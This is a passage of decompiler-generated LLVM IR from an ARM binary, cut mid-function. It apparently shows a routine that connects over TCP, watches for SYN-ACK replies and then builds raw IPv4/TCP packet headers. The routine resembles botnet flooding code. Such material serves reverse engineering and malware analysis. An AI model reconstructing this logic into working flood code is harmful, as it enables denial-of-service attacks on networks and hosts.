  store i32 %v3_b4c4, i32* @sb, align 4
  br i1 %v7_b4c8, label %dec_label_pc_b6b8, label %dec_label_pc_b4d4

dec_label_pc_b4d4:                                ; preds = %dec_label_pc_b2f0
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b4dc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b4dc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b4f0 = call i32 @function_11378(i32 %v3_b4c4, i32 0, i32 3, i32 %v6_b4dc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b4f0, i32* %r0.global-to-local, align 4
  %v7_b4f4 = icmp eq i32 %v5_b4f0, -1
  store i1 %v7_b4f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b4f4, label %dec_label_pc_b6b0, label %dec_label_pc_b4fc

dec_label_pc_b4fc:                                ; preds = %dec_label_pc_b4d4
  %v0_b4fc = load i32, i32* @r7, align 4
  %v3_b4fc = mul i32 %v0_b4fc, 65536
  store i32 %v3_b4fc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_b504 = load i32, i32* @r6, align 4
  %v2_b504 = icmp eq i32 %v0_b504, 0
  store i1 %v2_b504, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b50c = urem i32 %v0_b4fc, 65536
  store i32 %v3_b50c, i32* @fp, align 4
  br i1 %v2_b504, label %dec_label_pc_b93c, label %dec_label_pc_b514.preheader

dec_label_pc_b514.preheader:                      ; preds = %dec_label_pc_b4fc
  %v2_b560 = ptrtoint i32* %stack_var_-144 to i32
  %v2_b5a4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b5dc = ptrtoint i32* %stack_var_-80 to i32
  %v2_b5e8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b5ec = ptrtoint i32* %stack_var_-48 to i32
  %v4_b64c = zext i8 %tmp to i32
  %v1_b650 = and i32 %v4_b64c, 18
  %v2_b654 = icmp eq i32 %v1_b650, 18
  %v4_b7f8 = sext i8 %v5_b354 to i32
  %sext = mul i32 %v5_b370, 16777216
  %v4_b808 = sdiv i32 %sext, 16777216
  %v3_b638 = sext i16 %tmp61 to i32
  %v1_b65c = and i32 %v4_b64c, 5
  %v2_b65c = icmp eq i32 %v1_b65c, 0
  %v4_b59c = add i32 %v2_b560, 82
  %v5_b59c = inttoptr i32 %v4_b59c to i16*
  %v1_b78c = add i32 %v6_b490, 40
  %v1_b8a0 = urem i32 %v5_b3d0, 2
  %tmp97 = sub nsw i32 0, %v1_b8a0
  %v4_b8a8 = and i32 %tmp97, 32
  %v1_b8b8 = urem i32 %v6_b3f0, 2
  %tmp98 = sub nsw i32 0, %v1_b8b8
  %v4_b8c0 = and i32 %tmp98, 16
  %v1_b8d0 = urem i32 %v6_b410, 2
  %tmp99 = sub nsw i32 0, %v1_b8d0
  %v4_b8d8 = and i32 %tmp99, 8
  %v1_b8e8 = urem i32 %v6_b430, 2
  %tmp100 = sub nsw i32 0, %v1_b8e8
  %v4_b8f0 = and i32 %tmp100, 4
  %v1_b900 = urem i32 %v6_b450, 2
  %tmp101 = sub nsw i32 0, %v1_b900
  %v3_b908 = and i32 %tmp101, 2
  %v1_b918 = urem i32 %v6_b470, 2
  br label %dec_label_pc_b514

dec_label_pc_b514:                                ; preds = %dec_label_pc_b514.preheader, %dec_label_pc_b688
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b688 ], [ %tmp34, %dec_label_pc_b514.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b688 ], [ %tmp37, %dec_label_pc_b514.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b520 = call i32 @function_113bc(i32 2, i32 1, i32 0)
  store i32 %v3_b520, i32* %r0.global-to-local, align 4
  %v7_b524 = icmp eq i32 %v3_b520, -1
  store i1 %v7_b524, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b520, i32* @r5, align 4
  br i1 %v7_b524, label %dec_label_pc_b688, label %dec_label_pc_b530

dec_label_pc_b530:                                ; preds = %dec_label_pc_b514, %dec_label_pc_b664
  %v0_b538 = phi i32 [ %v3_b678, %dec_label_pc_b664 ], [ %v3_b520, %dec_label_pc_b514 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b664 ], [ %stack_var_-62.0, %dec_label_pc_b514 ]
  %stack_var_-60.1 = phi i32 [ %v0_b738, %dec_label_pc_b664 ], [ %stack_var_-60.0, %dec_label_pc_b514 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b538 = call i32 @function_10a14(i32 %v0_b538, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b540 = or i32 %v2_b538, 2048
  store i32 %v1_b540, i32* %r2.global-to-local, align 4
  %v0_b544 = load i32, i32* @r5, align 4
  store i32 %v0_b544, i32* %r0.global-to-local, align 4
  %v2_b548 = call i32 @function_10a14(i32 %v0_b544, i32 4)
  %v3_b54c = load i32, i32* %stack_var_-44, align 4
  %v5_b554 = mul i32 %v3_b54c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_b560, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b568 = add i32 %v5_b554, %arg2
  store i32 %v2_b568, i32* %r3.global-to-local, align 4
  %v1_b56c = add i32 %v2_b568, 20
  %v2_b56c = inttoptr i32 %v1_b56c to i8*
  %v3_b56c = load i8, i8* %v2_b56c, align 1
  %v4_b56c = zext i8 %v3_b56c to i32
  store i32 %v4_b56c, i32* %r2.global-to-local, align 4
  %v2_b570 = icmp ugt i8 %v3_b56c, 30
  %v7_b570 = icmp eq i8 %v3_b56c, 31
  store i1 %v7_b570, i1* %cpsr_z.global-to-local, align 1
  %v2_b574 = xor i1 %v7_b570, true
  %v3_b574 = and i1 %v2_b570, %v2_b574
  br i1 %v3_b574, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_b530
  %v5_b574 = add i32 %v2_b568, 16
  %v6_b574 = inttoptr i32 %v5_b574 to i32*
  %v7_b574 = load i32, i32* %v6_b574, align 4
  store i32 %v7_b574, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_b530, %bb
  %v4_b578 = phi i32 [ %v2_b568, %dec_label_pc_b530 ], [ %v7_b574, %bb ]
  %v4_b578.stack_var_-60.1 = select i1 %v3_b574, i32 %v4_b578, i32 %stack_var_-60.1
  %v2_b57c = xor i1 %v2_b570, true
  %v3_b57c = or i1 %v7_b570, %v2_b57c
  br i1 %v3_b57c, label %dec_label_pc_b6c4, label %dec_label_pc_b580

dec_label_pc_b580:                                ; preds = %bb71, %dec_label_pc_b6c4
  %v0_b738 = phi i32 [ %v5_b714, %dec_label_pc_b6c4 ], [ %v4_b578.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b588 = load i32, i32* @sl, align 4
  %v9_b588 = icmp eq i32 %v0_b588, 65535
  store i1 %v9_b588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b588, label %dec_label_pc_b720, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_b580
  %v4_b58c = udiv i32 %v0_b588, 256
  %v2_b590 = urem i32 %v0_b588, 256
  store i32 %v2_b590, i32* %r2.global-to-local, align 4
  %v5_b594 = mul nuw nsw i32 %v2_b590, 256
  %v6_b594 = or i32 %v5_b594, %v4_b58c
  store i32 %v6_b594, i32* %r3.global-to-local, align 4
  store i32 %v2_b560, i32* %r0.global-to-local, align 4
  %v2_b59c = trunc i32 %v6_b594 to i16
  store i16 %v2_b59c, i16* %v5_b59c, align 2
  br label %dec_label_pc_b5a4

dec_label_pc_b5a4:                                ; preds = %.thread9, %dec_label_pc_b720
  %stack_var_-62.2 = phi i16 [ %v1_b720, %dec_label_pc_b720 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_b5a4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b5ac = load i32, i32* @r5, align 4
  store i32 %v0_b5ac, i32* %r0.global-to-local, align 4
  %v3_b5b0 = call i32 @function_111a4(i32 %v0_b5ac, i32 %v2_b5a4, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b5b8 = call i32 @function_10860(i32* null)
  store i32 %v2_b5b8, i32* %r0.global-to-local, align 4
  store i32 %v2_b5b8, i32* @r4, align 4
  %v9_b618 = icmp eq i32 %tmp35, %v0_b738
  %v4_b640 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b618 to i32
  %v9_b62c = icmp eq i1 %v9_b618, false
  %v9_b644 = icmp eq i32 %v3_b638, %v4_b640
  br label %dec_label_pc_b5d4

dec_label_pc_b5c4:                                ; preds = %.thread, %dec_label_pc_b634, %dec_label_pc_b65c, %bb75
  %v2_b5c4 = call i32 @function_10860(i32* null)
  %v0_b5c8 = load i32, i32* @r4, align 4
  %v2_b5c8 = sub i32 %v2_b5c4, %v0_b5c8
  store i32 %v2_b5c8, i32* %r0.global-to-local, align 4
  %v7_b5cc = icmp eq i32 %v2_b5c8, 10
  store i1 %v7_b5cc, i1* %cpsr_z.global-to-local, align 1
  %v8_b5d0 = icmp sgt i32 %v2_b5c8, 10
  br i1 %v8_b5d0, label %dec_label_pc_b664, label %dec_label_pc_b5d4

dec_label_pc_b5d4:                                ; preds = %dec_label_pc_b5c4, %dec_label_pc_b5a4
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_b5e8, i32* %r1.global-to-local, align 4
  store i32 %v2_b5ec, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b5f4 = load i32, i32* @sb, align 4
  store i32 %v0_b5f4, i32* %r0.global-to-local, align 4
  %v6_b5fc = call i32 @function_112c4(i32 %v0_b5f4, i32 %v2_b5e8, i32 256, i32 16384, i32 %v2_b5dc, i32 %v2_b5ec)
  store i32 %v6_b5fc, i32* %r2.global-to-local, align 4
  %v7_b604 = icmp eq i32 %v6_b5fc, -1
  store i1 %v7_b604, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b604, label %dec_label_pc_b6b8, label %dec_label_pc_b610

dec_label_pc_b610:                                ; preds = %dec_label_pc_b5d4
  store i32 %v0_b738, i32* %r1.global-to-local, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_b624 = icmp eq i32 %v6_b5fc, 40
  store i1 %v7_b624, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_b5fc, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_b610
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b5c4

bb75:                                             ; preds = %dec_label_pc_b610
  store i1 %v9_b62c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b62c, label %dec_label_pc_b5c4, label %dec_label_pc_b634

dec_label_pc_b634:                                ; preds = %bb75
  store i32 %v3_b638, i32* @lr, align 4
  store i32 %v2_b560, i32* @r3, align 4
  store i32 %v4_b640, i32* %r2.global-to-local, align 4
  store i1 %v9_b644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b644, label %dec_label_pc_b64c, label %dec_label_pc_b5c4

dec_label_pc_b64c:                                ; preds = %dec_label_pc_b634
  store i32 %v4_b64c, i32* %r2.global-to-local, align 4
  store i32 %v1_b650, i32* @r3, align 4
  store i1 %v2_b654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b654, label %dec_label_pc_b730, label %dec_label_pc_b65c

dec_label_pc_b65c:                                ; preds = %dec_label_pc_b64c
  store i1 %v2_b65c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b65c, label %dec_label_pc_b5c4, label %dec_label_pc_b664

dec_label_pc_b664:                                ; preds = %dec_label_pc_b65c, %dec_label_pc_b5c4
  %v0_b664 = load i32, i32* @r5, align 4
  store i32 %v0_b664, i32* %r0.global-to-local, align 4
  %v1_b668 = call i32 @function_10be0(i32 %v0_b664)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b678 = call i32 @function_113bc(i32 2, i32 1, i32 0)
  store i32 %v3_b678, i32* %r0.global-to-local, align 4
  %v3_b67c = icmp eq i32 %v3_b678, -1
  %v8_b67c = icmp eq i32 %v3_b678, -1
  store i1 %v8_b67c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b678, i32* @r5, align 4
  br i1 %v3_b67c, label %dec_label_pc_b688, label %dec_label_pc_b530

dec_label_pc_b688:                                ; preds = %dec_label_pc_b664, %dec_label_pc_b514, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b514 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_b664 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b514 ], [ %v0_b738, %bb82 ], [ %v0_b738, %dec_label_pc_b664 ]
  %v3_b688 = load i32, i32* %stack_var_-44, align 4
  %v1_b68c = add i32 %v3_b688, 1
  store i32 %v1_b68c, i32* @r3, align 4
  %v1_b690 = load i32, i32* @r6, align 4
  %v9_b690 = icmp eq i32 %v1_b68c, %v1_b690
  store i1 %v9_b690, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b68c, i32* %stack_var_-44, align 4
  %v5_b698 = icmp slt i32 %v1_b68c, %v1_b690
  br i1 %v5_b698, label %dec_label_pc_b514, label %dec_label_pc_b69c

dec_label_pc_b69c:                                ; preds = %dec_label_pc_b688
  store i32 %v6_b490, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b94c

dec_label_pc_b6b0:                                ; preds = %dec_label_pc_b4d4
  %v0_b6b0 = load i32, i32* @sb, align 4
  store i32 %v0_b6b0, i32* %r0.global-to-local, align 4
  %v1_b6b4 = call i32 @function_10be0(i32 %v0_b6b0)
  store i32 %v1_b6b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6b8

dec_label_pc_b6b8:                                ; preds = %dec_label_pc_b5d4, %dec_label_pc_b2f0, %dec_label_pc_b6b0
  %v1_b6c0 = phi i32 [ %v3_b4c4, %dec_label_pc_b2f0 ], [ %v1_b6b4, %dec_label_pc_b6b0 ], [ 0, %dec_label_pc_b5d4 ]
  store i32 %v27_b2f0, i32* %lr.global-to-local, align 4
  ret i32 %v1_b6c0

dec_label_pc_b6c4:                                ; preds = %bb71
  %v1_b6c4 = add i32 %v4_b578, 16
  %v2_b6c4 = inttoptr i32 %v1_b6c4 to i32*
  %v3_b6c4 = load i32, i32* %v2_b6c4, align 4
  store i32 %v3_b6c4, i32* @r4, align 4
  %v0_b6c8 = call i32 @function_e094()
  store i32 %v0_b6c8, i32* %r0.global-to-local, align 4
  %v3_b6cc = load i32, i32* %stack_var_-44, align 4
  %v5_b6d4 = mul i32 %v3_b6cc, 24
  %v0_b6dc = load i32, i32* @r4, align 4
  %v1_b6dc = and i32 %v0_b6dc, 16711680
  store i32 %v1_b6dc, i32* %ip.global-to-local, align 4
  %v3_b6e0 = udiv i32 %v0_b6dc, 16777216
  %v2_b6e4 = add i32 %v5_b6d4, %arg2
  store i32 %v2_b6e4, i32* %r1.global-to-local, align 4
  %v4_b6e8 = udiv i32 %v1_b6dc, 256
  %v5_b6e8 = or i32 %v4_b6e8, %v3_b6e0
  store i32 %v5_b6e8, i32* %r2.global-to-local, align 4
  %v1_b6ec = and i32 %v0_b6dc, 65280
  store i32 %v1_b6ec, i32* %r3.global-to-local, align 4
  %v1_b6f0 = add i32 %v2_b6e4, 20
  %v2_b6f0 = inttoptr i32 %v1_b6f0 to i8*
  %v3_b6f0 = load i8, i8* %v2_b6f0, align 1
  %v4_b6f0 = zext i8 %v3_b6f0 to i32
  store i32 %v4_b6f0, i32* %ip.global-to-local, align 4
  %v5_b6f8 = call i32 @llvm.bswap.i32(i32 %v0_b6dc)
  %v7_b6fc = lshr i32 %v0_b6c8, %v4_b6f0
  %v8_b6fc = add i32 %v7_b6fc, %v5_b6f8
  store i32 %v8_b6fc, i32* %r2.global-to-local, align 4
  %v1_b700 = and i32 %v8_b6fc, 16711680
  store i32 %v1_b700, i32* %r0.global-to-local, align 4
  %v1_b70c = and i32 %v8_b6fc, 65280
  store i32 %v1_b70c, i32* %r1.global-to-local, align 4
  %v5_b714 = call i32 @llvm.bswap.i32(i32 %v8_b6fc)
  store i32 %v5_b714, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b580

dec_label_pc_b720:                                ; preds = %dec_label_pc_b580
  %v0_b720 = call i32 @function_e094()
  %v1_b720 = trunc i32 %v0_b720 to i16
  store i32 %v0_b720, i32* %r0.global-to-local, align 4
  store i32 %v2_b560, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b5a4

dec_label_pc_b730:                                ; preds = %dec_label_pc_b64c
  %v3_b730 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b730, i32* @r4, align 4
  store i32 %v2_b30c, i32* %ip.global-to-local, align 4
  %v5_b738 = mul i32 %v3_b730, 16
  %v6_b738 = add i32 %v5_b738, %v2_b30c
  %v7_b738 = inttoptr i32 %v6_b738 to i32*
  store i32 %v0_b738, i32* %v7_b738, align 4
  %v0_b73c = load i32, i32* @r8, align 4
  %v1_b73c = add i32 %v0_b73c, 4
  %v2_b73c = inttoptr i32 %v1_b73c to i32*
  %v3_b73c = load i32, i32* %v2_b73c, align 4
  store i32 %v3_b73c, i32* %r1.global-to-local, align 4
  %v1_b748 = and i32 %v3_b73c, 65280
  store i32 %v1_b748, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r0.global-to-local, align 4
  %v0_b758 = load i32, i32* @r4, align 4
  %v3_b758 = mul i32 %v0_b758, 16
  %v2_b75c = add i32 %v3_b758, %v2_b30c
  store i32 %v2_b75c, i32* %ip.global-to-local, align 4
  %v5_b760 = call i32 @llvm.bswap.i32(i32 %v3_b73c)
  store i32 %v5_b760, i32* %r3.global-to-local, align 4
  %v2_b764 = add i32 %v2_b75c, 4
  %v3_b764 = inttoptr i32 %v2_b764 to i32*
  store i32 %v5_b760, i32* %v3_b764, align 4
  %v0_b768 = load i32, i32* @r8, align 4
  %v1_b768 = add i32 %v0_b768, 8
  %v2_b768 = inttoptr i32 %v1_b768 to i32*
  %v3_b768 = load i32, i32* %v2_b768, align 4
  store i32 %v3_b768, i32* %r1.global-to-local, align 4
  %v1_b76c = and i32 %v3_b768, 16711680
  store i32 %v1_b76c, i32* %r0.global-to-local, align 4
  store i32 %v6_b490, i32* %r2.global-to-local, align 4
  %v5_b784 = call i32 @llvm.bswap.i32(i32 %v3_b768)
  store i32 %v5_b784, i32* %r3.global-to-local, align 4
  %v1_b788 = add i32 %v0_b768, 2
  %v2_b788 = inttoptr i32 %v1_b788 to i16*
  %v3_b788 = load i16, i16* %v2_b788, align 2
  %v4_b788 = zext i16 %v3_b788 to i32
  store i32 %v4_b788, i32* %r1.global-to-local, align 4
  store i32 %v1_b78c, i32* @r7, align 4
  %v0_b790 = load i32, i32* @lr, align 4
  %v1_b790 = trunc i32 %v0_b790 to i16
  %v2_b790 = load i32, i32* %ip.global-to-local, align 4
  %v3_b790 = add i32 %v2_b790, 14
  %v4_b790 = inttoptr i32 %v3_b790 to i16*
  store i16 %v1_b790, i16* %v4_b790, align 2
  %v0_b794 = load i32, i32* %r1.global-to-local, align 4
  %v1_b794 = trunc i32 %v0_b794 to i16
  %v2_b794 = load i32, i32* %ip.global-to-local, align 4
  %v3_b794 = add i32 %v2_b794, 12
  %v4_b794 = inttoptr i32 %v3_b794 to i16*
  store i16 %v1_b794, i16* %v4_b794, align 2
  %v0_b798 = load i32, i32* %r3.global-to-local, align 4
  %v1_b798 = load i32, i32* %ip.global-to-local, align 4
  %v2_b798 = add i32 %v1_b798, 8
  %v3_b798 = inttoptr i32 %v2_b798 to i32*
  store i32 %v0_b798, i32* %v3_b798, align 4
  %v0_b79c = load i32, i32* @r7, align 4
  store i32 %v0_b79c, i32* %r0.global-to-local, align 4
  %v1_b7a0 = call i32 @function_11604(i32 %v0_b79c)
  store i32 %v1_b7a0, i32* %r0.global-to-local, align 4
  store i32 %v2_b31c, i32* %r3.global-to-local, align 4
  %v2_b7ac = load i32, i32* @r4, align 4
  %v5_b7ac = mul i32 %v2_b7ac, 4
  %v6_b7ac = add i32 %v5_b7ac, %v2_b31c
  %v7_b7ac = inttoptr i32 %v6_b7ac to i32*
  store i32 %v1_b7a0, i32* %v7_b7ac, align 4
  %v3_b7b0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b7b0, i32* %r2.global-to-local, align 4
  %v0_b7b4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b7b4 = mul i32 %v3_b7b0, 4
  %v5_b7b4 = add i32 %v0_b7b4, %v4_b7b4
  %v6_b7b4 = inttoptr i32 %v5_b7b4 to i32*
  %v7_b7b4 = load i32, i32* %v6_b7b4, align 4
  store i32 %v7_b7b4, i32* @r4, align 4
  %v1_b7b8 = inttoptr i32 %v7_b7b4 to i8*
  %v2_b7b8 = load i8, i8* %v1_b7b8, align 1
  %tmp103 = urem i8 %v2_b7b8, 16
  %v1_b7bc = zext i8 %tmp103 to i32
  %v1_b7c0 = or i32 %v1_b7bc, 64
  store i32 %v1_b7c0, i32* %r3.global-to-local, align 4
  %v1_b7c4 = trunc i32 %v1_b7c0 to i8
  store i8 %v1_b7c4, i8* %v1_b7b8, align 1
  %v0_b7c8 = load i32, i32* @r4, align 4
  %v1_b7c8 = inttoptr i32 %v0_b7c8 to i8*
  %v2_b7c8 = load i8, i8* %v1_b7c8, align 1
  %v0_b7cc = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b7cc, 256
  %v1_b7d4 = and i8 %v2_b7c8, -16
  %v1_b7d8 = or i8 %v1_b7d4, 5
  %v1_b7dc = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b7cc, 256
  %v4_b7e0 = urem i32 %tmp78, 256
  %v5_b7e0 = or i32 %v4_b7e0, %v1_b7dc
  store i32 %v5_b7e0, i32* %r2.global-to-local, align 4
  %v0_b7e4 = load i32, i32* @fp, align 4
  %v1_b7e4 = urem i32 %v0_b7e4, 256
  store i32 %v1_b7e4, i32* %r0.global-to-local, align 4
  store i32 %v1_b39c, i32* %ip.global-to-local, align 4
  %v3_b7ec = udiv i32 %v0_b7e4, 256
  store i32 %v3_b7ec, i32* %r1.global-to-local, align 4
  store i8 %v1_b7d8, i8* %v1_b7c8, align 1
  %v0_b7f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b7f4 = load i32, i32* %r0.global-to-local, align 4
  %v4_b7f4 = mul i32 %v1_b7f4, 256
  %v5_b7f4 = or i32 %v4_b7f4, %v0_b7f4
  store i32 %v5_b7f4, i32* %r1.global-to-local, align 4
  store i32 %v4_b7f8, i32* %r0.global-to-local, align 4
  %v2_b7fc = load i32, i32* @r4, align 4
  %v3_b7fc = add i32 %v2_b7fc, 1
  %v4_b7fc = inttoptr i32 %v3_b7fc to i8*
  store i8 %v5_b354, i8* %v4_b7fc, align 1
  %v0_b800 = load i32, i32* %r1.global-to-local, align 4
  %v1_b800 = trunc i32 %v0_b800 to i16
  %v2_b800 = load i32, i32* @r4, align 4
  %v3_b800 = add i32 %v2_b800, 4
  %v4_b800 = inttoptr i32 %v3_b800 to i16*
  store i16 %v1_b800, i16* %v4_b800, align 2
  %v0_b804 = load i32, i32* %ip.global-to-local, align 4
  %v2_b804 = icmp eq i32 %v0_b804, 0
  store i1 %v2_b804, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b808, i32* %r1.global-to-local, align 4
  %v0_b80c = load i32, i32* %r2.global-to-local, align 4
  %v1_b80c = trunc i32 %v0_b80c to i16
  %v2_b80c = load i32, i32* @r4, align 4
  %v3_b80c = add i32 %v2_b80c, 2
  %v4_b80c = inttoptr i32 %v3_b80c to i16*
  store i16 %v1_b80c, i16* %v4_b80c, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b804, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_b730
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_b730, %bb79
  %v0_b818 = load i32, i32* %r1.global-to-local, align 4
  %v1_b818 = trunc i32 %v0_b818 to i8
  %v2_b818 = load i32, i32* @r4, align 4
  %v3_b818 = add i32 %v2_b818, 8
  %v4_b818 = inttoptr i32 %v3_b818 to i8*
  store i8 %v1_b818, i8* %v4_b818, align 1
  %v0_b81c = load i32, i32* %r3.global-to-local, align 4
  %v1_b81c = trunc i32 %v0_b81c to i8
  %v2_b81c = load i32, i32* @r4, align 4
  %v3_b81c = add i32 %v2_b81c, 9
  %v4_b81c = inttoptr i32 %v3_b81c to i8*
  store i8 %v1_b81c, i8* %v4_b81c, align 1
  %v0_b820 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b820, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b820 = load i32, i32* %r2.global-to-local, align 4
  %v2_b820 = trunc i32 %v1_b820 to i16
  %v3_b820 = load i32, i32* @r4, align 4
  %v4_b820 = add i32 %v3_b820, 6
  %v5_b820 = inttoptr i32 %v4_b820 to i16*
  store i16 %v2_b820, i16* %v5_b820, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_20780.45 to i32), i32* %r2.global-to-local, align 4
  %v2_b828 = load i32, i32* @global_var_20780.45, align 4
  store i32 %v2_b828, i32* %r1.global-to-local, align 4
  %v1_b82c = load i32, i32* @r4, align 4
  %v2_b82c = add i32 %v1_b82c, 12
  %v3_b82c = inttoptr i32 %v2_b82c to i32*
  store i32 %v2_b828, i32* %v3_b82c, align 4
  %v3_b830 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b830, i32* %r3.global-to-local, align 4
  store i32 %v2_b30c, i32* %ip.global-to-local, align 4
  %v4_b838 = mul i32 %v3_b830, 16
  %v5_b838 = add i32 %v4_b838, %v2_b30c
  %v6_b838 = inttoptr i32 %v5_b838 to i32*
  %v7_b838 = load i32, i32* %v6_b838, align 4
  store i32 %v7_b838, i32* %r2.global-to-local, align 4
  store i32 %v5_b838, i32* %r3.global-to-local, align 4
  %v1_b844 = load i32, i32* @r4, align 4
  %v2_b844 = add i32 %v1_b844, 16
  %v3_b844 = inttoptr i32 %v2_b844 to i32*
  store i32 %v7_b838, i32* %v3_b844, align 4
  %v0_b848 = load i32, i32* %r3.global-to-local, align 4
  %v1_b848 = add i32 %v0_b848, 12
  %v2_b848 = inttoptr i32 %v1_b848 to i16*
  %v3_b848 = load i16, i16* %v2_b848, align 2
  %v4_b848 = zext i16 %v3_b848 to i32
  store i32 %v4_b848, i32* %r0.global-to-local, align 4
  %v1_b84c = add i32 %v0_b848, 8
  %v2_b84c = inttoptr i32 %v1_b84c to i32*
  %v3_b84c = load i32, i32* %v2_b84c, align 4
  store i32 %v3_b84c, i32* %r1.global-to-local, align 4
  %v2_b850 = load i32, i32* @r4, align 4
  %v3_b850 = add i32 %v2_b850, 20
  %v4_b850 = inttoptr i32 %v3_b850 to i16*
  store i16 %v3_b848, i16* %v4_b850, align 2
  %v0_b854 = load i32, i32* @r4, align 4
  %v1_b854 = add i32 %v0_b854, 20
  store i32 %v1_b854, i32* @r8, align 4
  %v1_b858 = add i32 %v0_b854, 33
  %v2_b858 = inttoptr i32 %v1_b858 to i8*
  %v3_b858 = load i8, i8* %v2_b858, align 1
  %v4_b858 = zext i8 %v3_b858 to i32
  store i32 %v4_b858, i32* %r2.global-to-local, align 4
  %v0_b85c = load i32, i32* %r1.global-to-local, align 4
  %v2_b85c = add i32 %v0_b854, 24
  %v3_b85c = inttoptr i32 %v2_b85c to i32*
  store i32 %v0_b85c, i32* %v3_b85c, align 4
  %v0_b860 = load i32, i32* %r2.global-to-local, align 4
  %v1_b860 = or i32 %v0_b860, 1
  store i32 %v1_b860, i32* %r2.global-to-local, align 4
  %v0_b864 = load i32, i32* %r3.global-to-local, align 4
  %v1_b864 = add i32 %v0_b864, 4
  %v2_b864 = inttoptr i32 %v1_b864 to i32*
  %v3_b864 = load i32, i32* %v2_b864, align 4
  store i32 %v3_b864, i32* %r1.global-to-local, align 4
  %v1_b868 = add i32 %v0_b864, 14
  %v2_b868 = inttoptr i32 %v1_b868 to i16*
  %v3_b868 = load i16, i16* %v2_b868, align 2
  %v4_b868 = zext i16 %v3_b868 to i32
  store i32 %v4_b868, i32* %r3.global-to-local, align 4
  %v1_b86c = trunc i32 %v1_b860 to i8
  %v2_b86c = load i32, i32* @r8, align 4
  %v3_b86c = add i32 %v2_b86c, 13
  %v4_b86c = inttoptr i32 %v3_b86c to i8*
  store i8 %v1_b86c, i8* %v4_b86c, align 1
  %v0_b870 = load i32, i32* %r3.global-to-local, align 4
  %v1_b870 = trunc i32 %v0_b870 to i16
  %v2_b870 = load i32, i32* @r8, align 4
  %v3_b870 = add i32 %v2_b870, 2
